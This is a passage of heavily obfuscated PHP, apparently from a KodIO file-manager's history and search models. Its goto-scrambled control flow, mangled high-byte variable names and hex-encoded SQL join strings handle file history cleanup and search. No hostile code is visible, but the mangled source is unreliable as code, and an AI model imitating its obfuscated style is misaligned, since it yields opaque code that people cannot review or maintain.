$bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[379]] : $bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[378]], $BˆÜ¸Ñß£ß[420] => $bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[419]], $BˆÜ¸Ñß£ß[522] => $bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[77]], $BˆÜ¸Ñß£ß[2304] => $c•’ù²‹ùÑ); $fÓÖ™¥ˆ¡« = $GLOBALS[$BˆÜ¸Ñß£ß[6]][$BˆÜ¸Ñß£ß[84]][$BˆÜ¸Ñß£ß[2305]]; if ($fÓÖ™¥ˆ¡« > 1) { $this->historyAutoClear($FÀšŒ’”ÜÑ[$BˆÜ¸Ñß£ß[369]]); $this->add($FÀšŒ’”ÜÑ); } Model($BˆÜ¸Ñß£ß[2306])->eventFileEdit($bµÇŸ‚µÕÔ[$BˆÜ¸Ñß£ß[369]]); } private function historyAutoClear($E´”ä–é Ğ) { goto Dä«Ô‘Äâ÷; Dä«Ô‘Äâ÷: $CÔ½£áâ¡¨ =& $_SERVER[í™]; $F¨»Ëè‘Ë = Model($CÔ½£áâ¡¨[1074])->get($CÔ½£áâ¡¨[2307]); $d‰¦¥Œº¢ = $GLOBALS[$CÔ½£áâ¡¨[6]][$CÔ½£áâ¡¨[84]][$CÔ½£áâ¡¨[2305]]; goto aíÄĞóˆ‰¿; Cæğ‰ “Ê: $d…Ü¥îùŠÅ = array($CÔ½£áâ¡¨[385] => array($CÔ½£áâ¡¨[7], $F–‘¢òŒÚ¥)); $this->where($d…Ü¥îùŠÅ)->delete(); Model($CÔ½£áâ¡¨[422])->remove($bÏ¼„çíæ¢); goto EØµ¶ªß™°; AÛæ¸ÃÒë×: if ($B¤”‡£ê‡” >= 500) { return; } $d…Ü¥îùŠÅ = array($CÔ½£áâ¡¨[383] => $E´”ä–é Ğ); $eÎ­ëğŒÉô = $this->field($CÔ½£áâ¡¨[2309])->where($d…Ü¥îùŠÅ)->order($CÔ½£áâ¡¨[2301])->select(); goto bÑ‹ØÔ¾Œ; bÑ‹ØÔ¾Œ: if (!$eÎ­ëğŒÉô || $B¤”‡£ê‡” >= count($eÎ­ëğŒÉô)) { return; } $F–‘¢òŒÚ¥ = array_to_keyvalue($eÎ­ëğŒÉô, $CÔ½£áâ¡¨[33], $CÔ½£áâ¡¨[367]); $F–‘¢òŒÚ¥ = array_slice($F–‘¢òŒÚ¥, $B¤”‡£ê‡”); goto d®ñ‡ãÇàÁ; d®ñ‡ãÇàÁ: $bÏ¼„çíæ¢ = array_to_keyvalue($eÎ­ëğŒÉô, $CÔ½£áâ¡¨[33], $CÔ½£áâ¡¨[419]); $bÏ¼„çíæ¢ = array_slice($bÏ¼„çíæ¢, $B¤”‡£ê‡”); if (!$F–‘¢òŒÚ¥ || !$bÏ¼„çíæ¢) { return; } goto Cæğ‰ “Ê; aíÄĞóˆ‰¿: $a«²Û§É‹· = $F¨»Ëè‘Ë == $CÔ½£áâ¡¨[2308] ? 3 : $d‰¦¥Œº¢; if ($d‰¦¥Œº¢ <= 1) { $a«²Û§É‹· = 1; } $B¤”‡£ê‡” = $a«²Û§É‹· - 1; goto AÛæ¸ÃÒë×; EØµ¶ªß™°: } public function listData($dŠíéè°“¯) { goto Fé¼ø…ì; bÌŠïò±¯î: $DØ‚Ü§¼Õô = 3; if ($Aƒì¼Ÿˆ„Á == $bÖŸ³œŠï[2308]) { $Bé‚’¤ ¤[$bÖŸ³œŠï[354]] = array_slice($Bé‚’¤ ¤[$bÖŸ³œŠï[354]], 0, $DØ‚Ü§¼Õô); $Bé‚’¤ ¤[$bÖŸ³œŠï[351]] = array($bÖŸ³œŠï[2311] => 1, $bÖŸ³œŠï[2312] => 20, $bÖŸ³œŠï[2313] => 1, $bÖŸ³œŠï[2314] => count($Bé‚’¤ ¤[$bÖŸ³œŠï[354]])); } return $Bé‚’¤ ¤; goto aÛƒ®ˆÊÄ; Fé¼ø…ì: $bÖŸ³œŠï =& $_SERVER[í™]; $c¢¬ê÷ÔÏ = array($bÖŸ³œŠï[383] => $dŠíéè°“¯); $D·ÜÔ¤òÍ = $bÖŸ³œŠï[2310]; goto CÕ½ìô·ÓÃ; CÕ½ìô·ÓÃ: $Bé‚’¤ ¤ = $this->field($D·ÜÔ¤òÍ)->where($c¢¬ê÷ÔÏ)->order($bÖŸ³œŠï[2301])->selectPage(); $this->_listAppendUser($Bé‚’¤ ¤[$bÖŸ³œŠï[354]]); $Aƒì¼Ÿˆ„Á = Model($bÖŸ³œŠï[1074])->get($bÖŸ³œŠï[2307]); goto bÌŠïò±¯î; aÛƒ®ˆÊÄ: } protected function _listAppendUser(&$EÌÑ±«Èè) { $b¾ÕÔÅÖ÷Ê =& $_SERVER[í™]; $aÉÉßÎÁ Ü = array_to_keyvalue($EÌÑ±«Èè, $b¾ÕÔÅÖ÷Ê[33], $b¾ÕÔÅÖ÷Ê[1423]); $A¾íÒù‚‹ƒ = Model($b¾ÕÔÅÖ÷Ê[479])->userListInfo($aÉÉßÎÁ Ü); foreach ($EÌÑ±«Èè as &$A§ò°ƒÛÆ) { $Bæ–¶›ÑØ¼ = $A§ò°ƒÛÆ[$b¾ÕÔÅÖ÷Ê[1423]]; $A§ò°ƒÛÆ[$b¾ÕÔÅÖ÷Ê[378]] = $A¾íÒù‚‹ƒ[$Bæ–¶›ÑØ¼] ? $A¾íÒù‚‹ƒ[$Bæ–¶›ÑØ¼] : !1; } } public function fileInfo($Eôğ¦˜‘’²) { $d®ß³ß¨öÂ =& $_SERVER[í™]; $fƒ£ñ¼‘â = $this->tablePrefix; $FÙÄËïˆ‹Ë = "{$fƒ£ñ¼‘â}\151\x6f\137\x66\x69\x6c\145\x20\x66\x69\154\x65\163\x20\x6f\156\40\146\151\154\145\163\56\x66\151\x6c\145\x49\104\x20\75\x20\x68\x69\163\164\157\x72\171\x2e\146\x69\x6c\x65\x49\x44"; return $this->alias($d®ß³ß¨öÂ[2315])->where(array($d®ß³ß¨öÂ[385] => $Eôğ¦˜‘’²))->join($FÙÄËïˆ‹Ë, $d®ß³ß¨öÂ[2316])->find(); } public function removeItem($A•î¸•¦ˆÛ) { $e‘´èöÕÄ =& $_SERVER[í™]; $CÚ‡ŞğÄ¸â = array($e‘´èöÕÄ[385] => $A•î¸•¦ˆÛ); $EÁŠØÉàÈˆ = $this->where($CÚ‡ŞğÄ¸â)->find(); if ($EÁŠØÉàÈˆ) { $dï‡Œ¦­‘· = $this->where($CÚ‡ŞğÄ¸â)->delete(); Model($e‘´èöÕÄ[422])->remove($EÁŠØÉàÈˆ[$e‘´èöÕÄ[419]]); return $dï‡Œ¦­‘·; } return !1; } public function removeBySource($c…©ºóŠö) { goto f¬†µŒõí; a›ï¢¹ˆ¨ : return !0; goto d¸°ˆ†ªˆÍ; Eïêå‰Î¡Š: $b×õÄÔ² = array($FâÉ¼­ÌÜ[383] => array($FâÉ¼­ÌÜ[7], $c…©ºóŠö)); $B¶ğ¹¼ó«Ï = $this->field($FâÉ¼­ÌÜ[420])->where($b×õÄÔ²)->select(); if ($B¶ğ¹¼ó«Ï) { $this->where($b×õÄÔ²)->delete(); $fØ›–ÎĞŠ› = array_to_keyvalue($B¶ğ¹¼ó«Ï, $FâÉ¼­ÌÜ[33], $FâÉ¼­ÌÜ[419]); Model($FâÉ¼­ÌÜ[422])->remove($fØ›–ÎĞŠ›); } goto a›ï¢¹ˆ¨ ; f¬†µŒõí: $FâÉ¼­ÌÜ =& $_SERVER[í™]; if (!$c…©ºóŠö) { return !1; } if (!is_array($c…©ºóŠö)) { $c…©ºóŠö = array($c…©ºóŠö); } goto Eïêå‰Î¡Š; d¸°ˆ†ªˆÍ: } public function setDetail($C•—àçÌİ¡, $B¤È¾‚Óâ) { $A÷ĞİİÁ =& $_SERVER[í™]; return $this->where(array($A÷ĞİİÁ[385] => $C•—àçÌİ¡))->save(array($A÷ĞİİÁ[2304] => $B¤È¾‚Óâ)); } public function rollbackToItem($EìŒ²Å‘íÌ, $bóŠ‡ÜäÔŸ) { goto d¬ŒİëìÆ; d¬ŒİëìÆ: $Eôš†¨Ê“º =& $_SERVER[í™]; $cİŒ‰Ãğó = Model($Eôš†¨Ê“º[734])->sourceInfo($EìŒ²Å‘íÌ); $this->addHistory($cİŒ‰Ãğó); goto E³Ã‰Ã¼£à; eŒï–á‹‡œ: return $this->where(array($Eôš†¨Ê“º[385] => $bóŠ‡ÜäÔŸ))->delete(); goto b²¹àĞ‰×›; E³Ã‰Ã¼£à: $BŸßŠŠù¬Å = $this->find($bóŠ‡ÜäÔŸ); $d¹¿…¤×”ù = array($Eôš†¨Ê“º[419] => $BŸßŠŠù¬Å[$Eôš†¨Ê“º[419]], $Eôš†¨Ê“º[77] => $BŸßŠŠù¬Å[$Eôš†¨Ê“º[77]], $Eôš†¨Ê“º[107] => time(), $Eôš†¨Ê“º[379] => USER_ID); Model($Eôš†¨Ê“º[734])->where(array($Eôš†¨Ê“º[369] => $EìŒ²Å‘íÌ))->save($d¹¿…¤×”ù); goto eŒï–á‹‡œ; b²¹àĞ‰×›: } public function clearSame($A†é„…Ã¿¦) { goto B‹‘“í™å; b‘òÓˆ…Ì: if (!$a‹¼ƒöŒ×) { return; } $this->where(array($e°£ÆÛë¶„[367] => array($e°£ÆÛë¶„[7], $a‹¼ƒöŒ×)))->delete(); Model($e°£ÆÛë¶„[422])->remove($DÇé¾Ñ¿Åô); goto eĞ®Õ×›¸; B‹‘“í™å: $e°£ÆÛë¶„ =& $_SERVER[í™]; $c¨‹•»—å• = $this->listData($A†é„…Ã¿¦); $EğÕå¹ºíÁ = array_to_keyvalue_group($c¨‹•»—å•, $e°£ÆÛë¶„[419]); goto b¸³…Œšì; b¸³…Œšì: $DÇé¾Ñ¿Åô = array(); $a‹¼ƒöŒ× = array(); foreach ($EğÕå¹ºíÁ as $Aåç”¿éîí) { if (!$Aåç”¿éîí || count($Aåç”¿éîí) <= 1) { continue; } foreach ($Aåç”¿éîí as $F®õÒÓ‰) { $DÇé¾Ñ¿Åô[] = $F®õÒÓ‰[$e°£ÆÛë¶„[419]]; $a‹¼ƒöŒ×[] = $F®õÒÓ‰[$e°£ÆÛë¶„[367]]; } } goto b‘òÓˆ…Ì; eĞ®Õ×›¸: } public function userSpace() { $AÊòÑœ¾Ÿ¾ =& $_SERVER[í™]; $a»Ÿ¢Ä´ ì = $this->tablePrefix; $eè‡–á¤Ğò = array($AÊòÑœ¾Ÿ¾[1414] => USER_ID); $Cå²ˆ« Õø = "{$a»Ÿ¢Ä´ ì}\x69\157\x5f\146\151\154\145\x20\146\x69\154\x65\x73\40\x6f\x6e\40\x66\151\154\145\x73\56\x66\151\x6c\145\111\104\x20\x3d\40\x68\x69\163\164\157\x72\171\x2e\x66\x69\154\x65\111\104"; return $this->alias($AÊòÑœ¾Ÿ¾[2315])->where($eè‡–á¤Ğò)->join($Cå²ˆ« Õø, $AÊòÑœ¾Ÿ¾[2316])->sum($AÊòÑœ¾Ÿ¾[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($f¸¯´œ‡´¡) { goto c«áóÀÂáÄ; c«áóÀÂáÄ: $a•æ‘©ë± =& $_SERVER[í™]; $F½Šá“¼á = KodIO::fileTypeList(); $Dô¿Ğ›÷ = $F½Šá“¼á[$f¸¯´œ‡´¡]; goto D²©…ºù±; c•ŒŠÛÎÅ¨: if (!$Dô¿Ğ›÷[$a•æ‘©ë±[160]]) { $b‡ÎÚø¶…â = array_to_keyvalue($F½Šá“¼á, $a•æ‘©ë±[33], $a•æ‘©ë±[160]); $F¾ÒÌĞãª› = implode($a•æ‘©ë±[47], $b‡ÎÚø¶…â); $Dí½÷‚“¶ = $a•æ‘©ë±[2267]; } $B±ˆŒíò÷Ö = explode($a•æ‘©ë±[47], trim($F¾ÒÌĞãª›, $a•æ‘©ë±[47])); return array($Dí½÷‚“¶, $B±ˆŒíò÷Ö); goto b’œ¶œéµŠ; D²©…ºù±: if (!$Dô¿Ğ›÷) { return array(); } $F¾ÒÌĞãª› = $Dô¿Ğ›÷[$a•æ‘©ë±[160]]; $Dí½÷‚“¶ = $a•æ‘©ë±[7]; goto c•ŒŠÛÎÅ¨; b’œ¶œéµŠ: } public function listPathType($fî…÷ãîù¯) { $dÜ³×Ÿ¢¡ =& $_SERVER[í™]; $fÌ¡¶³îò– = $this->fileTypeWhere($fî…÷ãîù¯); if (!$fÌ¡¶³îò–) { return array(); } $C–ÎİÂ‰ = array($dÜ³×Ÿ¢¡[523] => SourceModel::TYPE_USER, $dÜ³×Ÿ¢¡[524] => USER_ID, $dÜ³×Ÿ¢¡[520] => 0, $dÜ³×Ÿ¢¡[521] => $fÌ¡¶³îò–); return $this->listSource($C–ÎİÂ‰); } public function listSearch($Bµã’àÎ‘, $dÃÆ·±–¥— = 300) { goto DøŠïÕ…Ÿ‚; F™ßË•Š…: if (!isset($b›á–©¥§ [$Eƒ¦µÀç[397]])) { $b›á–©¥§ [$Eƒ¦µÀç[397]] = 0; } $d‡öÍÑÙŠŞ = $Eƒ¦µÀç[2318]; $DÓãñÌ¢Ä« = $d‡öÍÑÙŠŞ; goto Cİ“¨ø‰¦Ò; bÑäàĞù•: $this->_listSearchDesc($FÒ»Àö¸›Ò, $Bµã’àÎ‘, $DÓãñÌ¢Ä«); $this->_listSearchTag($FÒ»Àö¸›Ò, $Bµã’àÎ‘, $DÓãñÌ¢Ä«); $this->_listSearchGroupTag($FÒ»Àö¸›Ò, $Bµã’àÎ‘, $DÓãñÌ¢Ä«); goto D¬õ®ÏŒ¬; Cİ“¨ø‰¦Ò: $this->_listSearchBindPinyin($Bµã’àÎ‘, $b›á–©¥§ , $d‡öÍÑÙŠŞ); $this->alias($Eƒ¦µÀç[489])->_makeOrder()->cache(null, 10); $FÒ»Àö¸›Ò = $this->distinct(!0)->field($d‡öÍÑÙŠŞ)->where($b›á–©¥§ )->selectPage($dÃÆ·±–¥—); goto bÑäàĞù•; D¬õ®ÏŒ¬: $this->_listDataApply($FÒ»Àö¸›Ò[$Eƒ¦µÀç[354]]); $this->_listMake($FÒ»Àö¸›Ò); return $FÒ»Àö¸›Ò; goto b£¬Ó•Ï; DøŠïÕ…Ÿ‚: $Eƒ¦µÀç =& $_SERVER[í™]; if (isset($Bµã’àÎ‘[$Eƒ¦µÀç[2174]]) && $Bµã’àÎ‘[$Eƒ¦µÀç[2174]]) { $Bµã’àÎ‘[$Eƒ¦µÀç[2174]] = str_replace($Eƒ¦µÀç[1579], $Eƒ¦µÀç[2317], trim($Bµã’àÎ‘[$Eƒ¦µÀç[2174]])); } $b›á–©¥§  = $this->_parseSearchWhere($Bµã’àÎ‘); goto F™ßË•Š…; b£¬Ó•Ï: } private function _listSearchTag(&$F¢Ä˜øŞø, $DÀ•İä’Âğ, $A–ªÔÈ§ÌÌ) { goto FÄ¨œ…İ†×; d¡šÌ”ŠŠ: if (!$F¶øõìè¢Ä) { return; } $dğ¹³ŞÖˆ = array($e¡‘ŒÎ›ë·[393] => array($e¡‘ŒÎ›ë·[7], $F¶øõìè¢Ä), $e¡‘ŒÎ›ë·[1423] => USER_ID); $b«‰ùƒ…Œ = Model($e¡‘ŒÎ›ë·[394])->field($e¡‘ŒÎ›ë·[75])->where($dğ¹³ŞÖˆ)->select(); goto B…Ùî¢ç—; FÄ¨œ…İ†×: $e¡‘ŒÎ›ë· =& $_SERVER[í™]; if (!$DÀ•İä’Âğ[$e¡‘ŒÎ›ë·[2174]] || $F¢Ä˜øŞø[$e¡‘ŒÎ›ë·[351]][$e¡‘ŒÎ›ë·[340]] > 1) { return; } $e¡ÕÁìò‹” = Model($e¡‘ŒÎ›ë·[2319])->listData(); goto dÒòÉœ•Š; dÒòÉœ•Š: $F¶øõìè¢Ä = array(); $e¼ò‚ Ğï = $DÀ•İä’Âğ[$e¡‘ŒÎ›ë·[2174]]; foreach ($e¡ÕÁìò‹” as $F‚Ç®¨ãìğ) { $AØœ‘íµñ = $F‚Ç®¨ãìğ[$e¡‘ŒÎ›ë·[28]]; $a²ŒïòŠŸ› = str_replace($e¡‘ŒÎ›ë·[50], $e¡‘ŒÎ›ë·[33], Pinyin::encode($AØœ‘íµñ)); if (stripos($AØœ‘íµñ, $e¼ò‚ Ğï) !== !1 || stripos($a²ŒïòŠŸ›, $e¼ò‚ Ğï) !== !1) { $F¶øõìè¢Ä[] = $F‚Ç®¨ãìğ[$e¡‘ŒÎ›ë·[367]]; } } goto d¡šÌ”ŠŠ; B…Ùî¢ç—: $b«‰ùƒ…Œ = array_to_keyvalue($b«‰ùƒ…Œ, $e¡‘ŒÎ›ë·[33], $e¡‘ŒÎ›ë·[75]); $Cµ™´õ˜Ø° = array_unique($b«‰ùƒ…Œ); $this->_listSearchMerge($F¢Ä˜øŞø, $DÀ•İä’Âğ, $A–ªÔÈ§ÌÌ, $Cµ™´õ˜Ø°); goto DÖŸ°ğ“ƒ; DÖŸ°ğ“ƒ: } private function _listSearchDesc(&$fâš¡¬ÉÕä, $d¾Åå¬ñõ™, $Bäàµ†¨±) { goto d¸”—¿ì¢ç; d¸”—¿ì¢ç: $f¨‰ÉÏÌ Ê =& $_SERVER[í™]; if (!$d¾Åå¬ñõ™[$f¨‰ÉÏÌ Ê[2174]] || $fâš¡¬ÉÕä[$f¨‰ÉÏÌ Ê[351]][$f¨‰ÉÏÌ Ê[340]] > 1) { return; } $eß¿•á¿³Ë = $this->listSearchChildren($d¾Åå¬ñõ™[$f¨‰ÉÏÌ Ê[463]]); goto E½§¤±šÂ; E½§¤±šÂ: $eß¿•á¿³Ë = array_unique($eß¿•á¿³Ë); if (!$eß¿•á¿³Ë) { return; } $Aø±ìŒğÓÌ = array($f¨‰ÉÏÌ Ê[369] => array($f¨‰ÉÏÌ Ê[7], $eß¿•á¿³Ë), $f¨‰ÉÏÌ Ê[89] => $f¨‰ÉÏÌ Ê[405], $f¨‰ÉÏÌ Ê[359] => array($f¨‰ÉÏÌ Ê[733], $f¨‰ÉÏÌ Ê[2176] . $d¾Åå¬ñõ™[$f¨‰ÉÏÌ Ê[2174]] . $f¨‰ÉÏÌ Ê[2176])); goto F¶»°’¹Š; F¶»°’¹Š: $B…šŒ¯•óØ = Model($f¨‰ÉÏÌ Ê[506])->field($f¨‰ÉÏÌ Ê[369])->where($Aø±ìŒğÓÌ)->select(); $FÙ¨¹ãÉ±¾ = array_to_keyvalue($B…šŒ¯•óØ, $f¨‰ÉÏÌ Ê[33], $f¨‰ÉÏÌ Ê[369]); $this->_listSearchMerge($fâš¡¬ÉÕä, $d¾Åå¬ñõ™, $Bäàµ†¨±, $FÙ¨¹ãÉ±¾); goto BÇ¾¯§Á¥¬; BÇ¾¯§Á¥¬: } private function _listSearchGroupTag(&$f†®‚â„ß, $bÂë‡åî·, $a•à‰©İâä) { goto fº¿äºê£; DæÛ‰¢’“¬: $e÷Ùæ¥ = array_to_keyvalue($e÷Ùæ¥, $dšœã¬—í¾[33], $dšœã¬—í¾[75]); $F¸ŸÄ¡ò˜ = array_unique($e÷Ùæ¥); $this->_listSearchMerge($f†®‚â„ß, $bÂë‡åî·, $a•à‰©İâä, $F¸ŸÄ¡ò˜); goto c†¯Š¡®©ö; Eõ Èá”Û: if (!$D‡š¾êàÉ† || $D‡š¾êàÉ†[$dšœã¬—í¾[371]] != SourceModel::TYPE_GROUP) { return; } $dÂõøæÚ° = $D‡š¾êàÉ†[$dšœã¬—í¾[458]]; $Béš£ø¬…· = Model($dšœã¬—í¾[2320])->get($dÂõøæÚ°); goto E¯ÆÕ®„é; fº¿äºê£: $dšœã¬—í¾ =& $_SERVER[í™]; if (!$bÂë‡åî·[$dšœã¬—í¾[2174]] || $f†®‚â„ß[$dšœã¬—í¾[351]][$dšœã¬—í¾[340]] > 1 || !$bÂë‡åî·[$dšœã¬—í¾[463]]) { return; } $D‡š¾êàÉ† = $this->sourceInfo($bÂë‡åî·[$dšœã¬—í¾[463]]); goto Eõ Èá”Û; F°‹¯ŸËŒ÷: if (!$Eãƒ‘ä¦Ö) { return; } $dŠ®¸Íòö† = array($dšœã¬—í¾[393] => array($dšœã¬—í¾[7], $Eãƒ‘ä¦Ö), $dšœã¬—í¾[1423] => 0, $dšœã¬—í¾[29] => $dšœã¬—í¾[2194] . $dÂõøæÚ°); $e÷Ùæ¥ = Model($dšœã¬—í¾[394])->field($dšœã¬—í¾[75])->where($dŠ®¸Íòö†)->select(); goto DæÛ‰¢’“¬; E¯ÆÕ®„é: $Eãƒ‘ä¦Ö = array(); $c§ßµ×çÕ‰ = $bÂë‡åî·[$dšœã¬—í¾[2174]]; foreach ($Béš£ø¬…·[$dšœã¬—í¾[354]] as $eØ¤È§¢‹) { $A‹¹ÆİÙËİ = $eØ¤È§¢‹[$dšœã¬—í¾[28]]; $bø°ÕÙµß¡ = str_replace($dšœã¬—í¾[50], $dšœã¬—í¾[33], Pinyin::encode($A‹¹ÆİÙËİ)); if (stripos($A‹¹ÆİÙËİ, $c§ßµ×çÕ‰) !== !1 || stripos($bø°ÕÙµß¡, $c§ßµ×çÕ‰) !== !1) { $Eãƒ‘ä¦Ö[] = $eØ¤È§¢‹[$dšœã¬—í¾[367]]; } } goto F°‹¯ŸËŒ÷; c†¯Š¡®©ö: } private function _listSearchMerge(&$bÑë‰èà†ò, $b°†²—ô¡”, $AŠ§ÕÜ²À, $dóôÎ» ŠÑ) { goto fºµ¢¶®“; b‰÷¨êêœ: $e“Ú•Ûñš² = array_diff($dóôÎ» ŠÑ, $e„Œ«¾ˆŒì); if (!$e“Ú•Ûñš²) { return; } $FÍÒ‚Ü®è = array($EÀğ«Î›ƒ[369] => array($EÀğ«Î›ƒ[7], $e“Ú•Ûñš²)); goto DâŸçº¨íö; bãçÆ…§Øù: foreach ($F…ÃÜŒ¾ as $bëƒ‘ñê„ø) { $a‰š’ÇŸ‹´ = $EÀğ«Î›ƒ[47] . $b°†²—ô¡”[$EÀğ«Î›ƒ[463]] . $EÀğ«Î›ƒ[47]; if (stripos($bëƒ‘ñê„ø[$EÀğ«Î›ƒ[461]], $a‰š’ÇŸ‹´) !== !1) { $Fëœ…’ğñã[] = $bëƒ‘ñê„ø; } } $bÑë‰èà†ò[$EÀğ«Î›ƒ[354]] = array_merge($Fëœ…’ğñã, $bÑë‰èà†ò[$EÀğ«Î›ƒ[354]]); $bÑë‰èà†ò[$EÀğ«Î›ƒ[351]][$EÀğ«Î›ƒ[352]] += count($Fëœ…’ğñã); goto F½À¯ª˜¶¨; DâŸçº¨íö: $F…ÃÜŒ¾ = $this->field($AŠ§ÕÜ²À)->where($FÍÒ‚Ü®è)->select(); if (!$F…ÃÜŒ¾) { return; } $Fëœ…’ğñã = array(); goto bãçÆ…§Øù; fºµ¢¶®“: $EÀğ«Î›ƒ =& $_SERVER[í™]; if (!$dóôÎ» ŠÑ) { return; } $e„Œ«¾ˆŒì = array_to_keyvalue($bÑë‰èà†ò[$EÀğ«Î›ƒ[354]], $EÀğ«Î›ƒ[33], $EÀğ«Î›ƒ[369]); goto b‰÷¨êêœ; F½À¯ª˜¶¨: } public function listSearchChildren($Dô¤¯Ú©ƒ , $d‘µ½†ôÀí = 5000) { goto cå±âœì·; aëÓŸ˜ÚïŸ: $Bì°Îš = $this->field($cÓÙĞ×Î²é[369])->where($D›Õ´‡“)->select(); $DË•åòª¦ = array_to_keyvalue($Bì°Îš, $cÓÙĞ×Î²é[33], $cÓÙĞ×Î²é[369]); return $DË•åòª¦; goto D¨„ÌÎŞØ·; cå±âœì·: $cÓÙĞ×Î²é =& $_SERVER[í™]; $DË•åòª¦ = array(); $f¡ªÃá‘ô = $this->sourceInfo($Dô¤¯Ú©ƒ ); goto A²ƒ‡¤‚Ê; A²ƒ‡¤‚Ê: $D›Õ´‡“ = array($cÓÙĞ×Î²é[461] => array($cÓÙĞ×Î²é[733], $f¡ªÃá‘ô[$cÓÙĞ×Î²é[461]] . $f¡ªÃá‘ô[$cÓÙĞ×Î²é[369]] . $cÓÙĞ×Î²é[486])); $FÍ¾Õ¿œ•ó = $this->field($cÓÙĞ×Î²é[369])->cache(null, 600)->where($D›Õ´‡“)->count(); if ($FÍ¾Õ¿œ•ó > $d‘µ½†ôÀí) { return $this->_listSearchChildrenNear($Dô¤¯Ú©ƒ , $d‘µ½†ôÀí); } goto aëÓŸ˜ÚïŸ; D¨„ÌÎŞØ·: } private function _listSearchChildrenNear($dœˆ·Ë¼ƒ, $dØñÂ¿ğÌ) { goto C·ğ‚·Õ‘‚; d±­Ââ‹ò™: if (!$c®Ú£ÕğÏõ) { return $a…õˆÔÏÊˆ; } $C‰”ÀóÛ³ä = array($aê‰ñ¦Á›ù[463] => array($aê‰ñ¦Á›ù[7], $c®Ú£ÕğÏõ)); $E¢«ÙÆˆÄÈ = $this->field($aê‰ñ¦Á›ù[2321])->where($C‰”ÀóÛ³ä)->select(); goto Bšˆ¾ˆÎÒÀ; EåòÖÜ¨›½: $E¢«ÙÆˆÄÈ = $this->field($aê‰ñ¦Á›ù[2321])->where($C‰”ÀóÛ³ä)->select(); $c®Ú£ÕğÏõ = array_to_keyvalue(array_filter_by_field($E¢«ÙÆˆÄÈ, $aê‰ñ¦Á›ù[370], $aê‰ñ¦Á›ù[83]), $aê‰ñ¦Á›ù[33], $aê‰ñ¦Á›ù[369]); $a…õˆÔÏÊˆ = array_merge($a…õˆÔÏÊˆ, array_to_keyvalue($E¢«ÙÆˆÄÈ, $aê‰ñ¦Á›ù[33], $aê‰ñ¦Á›ù[369])); goto d±­Ââ‹ò™; C·ğ‚·Õ‘‚: $aê‰ñ¦Á›ù =& $_SERVER[í™]; $a…õˆÔÏÊˆ = array(); $C‰”ÀóÛ³ä = array($aê‰ñ¦Á›ù[463] => $dœˆ·Ë¼ƒ); goto EåòÖÜ¨›½; Bšˆ¾ˆÎÒÀ: $a…õˆÔÏÊˆ = array_merge($a…õˆÔÏÊˆ, array_to_keyvalue($E¢«ÙÆˆÄÈ, $aê‰ñ¦Á›ù[33], $aê‰ñ¦Á›ù[369])); $a…õˆÔÏÊˆ = array_slice($a…õˆÔÏÊˆ, 0, $dØñÂ¿ğÌ); return $a…õˆÔÏÊˆ; goto aŞ»Šë½ ; aŞ»Šë½ : } private function _listSearchBindPinyin($F…”ã…Ÿë, &$cˆï¶ˆäè, &$Cˆ”•¯ÖÜ•) { goto D¬–¸í¦ìŞ; D¬–¸í¦ìŞ: $CˆŒµÑ¥ =& $_SERVER[í™]; if (!Input::check($F…”ã…Ÿë[$CˆŒµÑ¥[2174]], $CˆŒµÑ¥[306]) || strlen($F…”ã…Ÿë[$CˆŒµÑ¥[2174]]) < 2) { return; } $Bí‹–ŞÍé = "\x4c\x45\106\124\x20\x4a\117\111\116\40{$this->tablePrefix}\151\x6f\x5f\x73\157\x75\162\x63\145\x5f\x6d\x65\x74\141\x20\x6d\x65\x74\x61\x20\x6f\156\x20\163\x6f\165\162\143\145\x2e\163\157\165\162\x63\x65\111\x44\x20\x3d\x20\x6d\145\164\141\x2e\x73\x6f\x75\x72\143\145\x49\x44"; goto BÑªºƒ§ÀÁ; BÑªºƒ§ÀÁ: $føõ‘õÜ¤ = array(); $Cˆ”•¯ÖÜ• = str_replace(array($CˆŒµÑ¥[217], $CˆŒµÑ¥[50], $CˆŒµÑ¥[2322]), $CˆŒµÑ¥[33], $Cˆ”•¯ÖÜ•); $Cˆ”•¯ÖÜ• = $CˆŒµÑ¥[2323] . str_replace($CˆŒµÑ¥[47], $CˆŒµÑ¥[2324], $Cˆ”•¯ÖÜ•); goto F‚×ñåöÂî; F‚×ñåöÂî: unset($cˆï¶ˆäè[$CˆŒµÑ¥[28]]); foreach ($cˆï¶ˆäè as $eŒîÀÛç§ => $FÑˆ‡ƒ‡ŠÓ) { $føõ‘õÜ¤[$CˆŒµÑ¥[2323] . $eŒîÀÛç§] = $FÑˆ‡ƒ‡ŠÓ; } $eÚƒ¢‰ï™ = array($CˆŒµÑ¥[485], $CˆŒµÑ¥[2176] . $F…”ã…Ÿë[$CˆŒµÑ¥[2174]] . $CˆŒµÑ¥[2176]); goto f–ë‡§Ø§¦; f–ë‡§Ø§¦: $føõ‘õÜ¤[] = array($CˆŒµÑ¥[2325] => $eÚƒ¢‰ï™, $CˆŒµÑ¥[899] => $CˆŒµÑ¥[2178], array($CˆŒµÑ¥[2326] => $eÚƒ¢‰ï™, $CˆŒµÑ¥[2327] => array($CˆŒµÑ¥[7], array($CˆŒµÑ¥[416], $CˆŒµÑ¥[415])))); $this->join($Bí‹–ŞÍé); $cˆï¶ˆäè = $føõ‘õÜ¤; goto CÖÃŞ–îÄÉ; CÖÃŞ–îÄÉ: } private function _parseSearchWhere($D¼ÕÓÅõÍö) { goto CµÎš¹‡„Ú; D»İÁÇÏ³í: if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[537]])) { $c²†Šƒ’Úê[] = array($e‡òËË«È‚[379] => $D¼ÕÓÅõÍö[$e‡òËË«È‚[537]], $e‡òËË«È‚[378] => $D¼ÕÓÅõÍö[$e‡òËË«È‚[537]], $e‡òËË«È‚[899] => $e‡òËË«È‚[2178]); } if (isset($D¼ÕÓÅõÍö[$e‡òËË«È‚[372]])) { $A¢×…Ô›Òµ = $D¼ÕÓÅõÍö[$e‡òËË«È‚[372]]; if ($A¢×…Ô›Òµ == $e‡òËË«È‚[76]) { $c²†Šƒ’Úê[$e‡òËË«È‚[370]] = 1; } else { if ($A¢×…Ô›Òµ == $e‡òËË«È‚[2333]) { $c²†Šƒ’Úê[$e‡òËË«È‚[370]] = 0; } else { if ($A¢×…Ô›Òµ) { $A¢×…Ô›Òµ = is_array($A¢×…Ô›Òµ) ? 